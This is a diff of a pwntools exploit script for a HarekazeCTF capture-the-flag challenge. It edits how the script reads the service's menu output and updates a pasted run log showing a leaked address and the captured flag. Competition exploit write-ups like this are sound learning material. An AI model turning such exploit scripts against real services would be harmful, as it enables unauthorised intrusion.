@@ -128,8 +128,7 @@ def flag_name(name, sz):
     r.sendline('{}'.format(sz))
     r.recvuntil('me: ')
     r.sendline('{}'.format(name))
-    log.success(r.recvuntil('ddr: '))
-    return r.recvline()
+    log.success(r.recvuntil('> '))
 
 def delete_name(addr):
     global r
@@ -171,13 +170,18 @@ add_name('AAAA', sz)
 add_name('BBBB', sz)
 
 flag_name('A'*25, sz)
+
 '''
 [+] Opening connection to problem.harekaze.com on port 20175: Done
 [*] flag is at: 0x204056
 [+] Done!
     Name: AAAAAAAAAAAAAAAAAAAAAAAAA
     HarekazeCTF{5m41l_smal1_f1ea_c0n7rol_7h3_w0rld}
-    Addr: 
+    Addr: 204066
+    1. Add name
+    2. Delete name
+    3. Exit
+    > 
 [*] Closed connection to problem.harekaze.com port 20175
 '''
 ```
